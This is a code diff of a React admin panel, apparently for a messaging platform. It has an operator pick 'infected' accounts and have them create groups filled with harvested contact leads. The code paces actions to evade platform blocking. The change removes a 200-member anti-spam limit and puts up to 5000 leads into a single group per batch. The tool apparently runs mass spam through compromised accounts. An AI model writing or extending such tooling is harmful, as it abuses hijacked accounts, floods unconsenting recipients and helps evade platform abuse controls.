@@ -723,7 +723,7 @@ export default function AdminPanel() {
     if (selectedPhones.size === 0) return alert('Selecione contas infectadas para criar grupos!');
     if (!groupNameTemplate.trim()) return alert('Digite um nome para os grupos!');
     
-    if (!confirm(`⚠️ CRIAR GRUPOS INTELIGENTES?\n\n• Nome: ${groupNameTemplate}\n• Foto: ${groupPhotoUrl ? 'Sim' : 'Não'}\n• Limites anti-spam: 200 membros por grupo\n• Pausas estratégicas entre criações\n• Distribuição automática de leads\n\nContas selecionadas: ${selectedPhones.size}`)) return;
+    if (!confirm(`⚠️ CRIAR GRUPOS INTELIGENTES?\n\n• Nome: ${groupNameTemplate}\n• Foto: ${groupPhotoUrl ? 'Sim' : 'Não'}\n• Pausas estratégicas entre criações\n• Distribuição automática de leads\n\nContas selecionadas: ${selectedPhones.size}`)) return;
 
     setIsCreatingGroups(true);
     setGroupCreationProgress(0);
@@ -732,9 +732,8 @@ export default function AdminPanel() {
 
     try {
       const availableCreators = Array.from(selectedPhones);
-      const GROUP_SIZE_LIMIT = 200; // Limite seguro para evitar bloqueio
       const DELAY_BETWEEN_GROUPS = 15000; // 15 segundos entre criações
-      const LEADS_PER_BATCH = 250; // Busca leads em lotes
+      const LEADS_PER_BATCH = 5000; // Busca leads em lotes (um grupo por lote, sem limite de membros)
 
       let groupsCreated = [];
       let totalLeadsAssigned = 0;
@@ -783,89 +782,78 @@ export default function AdminPanel() {
           break;
         }
 
-        // Calcula quantos grupos precisam ser criados
-        const groupsNeeded = Math.ceil(leads.length / GROUP_SIZE_LIMIT);
-        
-        for (let i = 0; i < groupsNeeded && availableCreators.length > 0; i++) {
-          if (stopBroadcastRef.current) break;
+        // Um grupo por lote: todos os leads do lote vão para um único grupo
+        const creatorPhone = availableCreators.shift();
+        const groupLeads = leads;
+        const groupName = groupNameTemplate.replace('{number}', groupCounter.toString().padStart(3, '0'));
 
-          const creatorPhone = availableCreators.shift();
-          const groupLeads = leads.slice(i * GROUP_SIZE_LIMIT, (i + 1) * GROUP_SIZE_LIMIT);
+        try {
+          const createRes = await authenticatedFetch('/api/create-group', {
+            method: 'POST',
+            body: JSON.stringify({
+              creatorPhone: creatorPhone,
+              leads: groupLeads,
+              groupName: groupName,
+              groupPhotoUrl: groupPhotoUrl
+            })
+          });
+
+          if (!createRes.ok) {
+            const errorText = await createRes.text();
+            addLog(`❌ Erro ao criar grupo ${groupName}: ${createRes.status} - ${errorText.substring(0, 100)}`);
+            availableCreators.push(creatorPhone);
+            continue;
+          }
           
-          // Gera nome único para o grupo
-          const groupName = groupNameTemplate.replace('{number}', groupCounter.toString().padStart(3, '0'));
-
+          const resContentType = createRes.headers.get('content-type');
+          if (!resContentType || !resContentType.includes('application/json')) {
+            const errorText = await createRes.text();
+            addLog(`❌ Resposta inválida ao criar grupo ${groupName}: ${errorText.substring(0, 100)}`);
+            availableCreators.push(creatorPhone);
+            continue;
+          }
+          
+          let createData;
           try {
-            const createRes = await authenticatedFetch('/api/create-group', {
-              method: 'POST',
-              body: JSON.stringify({
-                creatorPhone: creatorPhone,
-                leads: groupLeads,
-                groupName: groupName,
-                groupPhotoUrl: groupPhotoUrl
-              })
+            createData = await createRes.json();
+          } catch (jsonError) {
+            addLog(`⛔ Erro ao processar resposta JSON do grupo ${groupName}: ${jsonError.message}`);
+            availableCreators.push(creatorPhone);
+            continue;
+          }
+          
+          if (createData.success) {
+            groupsCreated.push({
+              id: createData.groupId,
+              name: groupName,
+              creatorPhone: creatorPhone,
+              memberCount: groupLeads.length,
+              createdAt: new Date().toISOString(),
+              leads: groupLeads,
+              photoUrl: groupPhotoUrl
             });
-
-            if (!createRes.ok) {
-              const errorText = await createRes.text();
-              addLog(`❌ Erro ao criar grupo ${groupName}: ${createRes.status} - ${errorText.substring(0, 100)}`);
-              availableCreators.push(creatorPhone);
-              continue;
-            }
             
-            const contentType = createRes.headers.get('content-type');
-            if (!contentType || !contentType.includes('application/json')) {
-              const errorText = await createRes.text();
-              addLog(`❌ Resposta inválida ao criar grupo ${groupName}: ${errorText.substring(0, 100)}`);
-              availableCreators.push(creatorPhone);
-              continue;
-            }
+            totalLeadsAssigned += groupLeads.length;
+            setGroupCreationProgress(stats.pending ? Math.round((totalLeadsAssigned / stats.pending) * 100) : 100);
+            groupCounter++;
             
-            let createData;
-            try {
-              createData = await createRes.json();
-            } catch (jsonError) {
-              addLog(`⛔ Erro ao processar resposta JSON do grupo ${groupName}: ${jsonError.message}`);
-              availableCreators.push(creatorPhone);
-              continue;
-            }
+            addLog(`✅ Grupo criado: ${groupName} (${groupLeads.length} membros)`);
             
-            if (createData.success) {
-              groupsCreated.push({
-                id: createData.groupId,
-                name: groupName,
-                creatorPhone: creatorPhone,
-                memberCount: groupLeads.length,
-                createdAt: new Date().toISOString(),
-                leads: groupLeads,
-                photoUrl: groupPhotoUrl
-              });
-              
-              totalLeadsAssigned += groupLeads.length;
-              setGroupCreationProgress(Math.round((totalLeadsAssigned / stats.pending) * 100));
-              groupCounter++;
-              
-              addLog(`✅ Grupo criado: ${groupName} (${groupLeads.length} membros)`);
-              
-              // Devolve o criador para a lista após um tempo
-              setTimeout(() => {
-                availableCreators.push(creatorPhone);
-              }, 300000); // 5 minutos de cooldown
-              
-            } else {
-              addLog(`❌ Falha ao criar grupo: ${createData.error}`);
-              availableCreators.push(creatorPhone); // Devolve em caso de falha
-            }
-          } catch (e) {
-            addLog(`⛔ Erro na criação: ${e.message}`);
+            setTimeout(() => {
+              availableCreators.push(creatorPhone);
+            }, 300000); // 5 minutos de cooldown
+            
+          } else {
+            addLog(`❌ Falha ao criar grupo: ${createData.error}`);
             availableCreators.push(creatorPhone);
           }
-
-          // Pausa estratégica entre criações
-          if (i < groupsNeeded - 1) {
-            await new Promise(r => setTimeout(r, DELAY_BETWEEN_GROUPS));
-          }
+        } catch (e) {
+          addLog(`⛔ Erro na criação: ${e.message}`);
+          availableCreators.push(creatorPhone);
         }
+
+        // Pausa estratégica antes da próxima rodada (próximo lote)
+        await new Promise(r => setTimeout(r, DELAY_BETWEEN_GROUPS));
       }
 
       setCreatedGroups(groupsCreated);
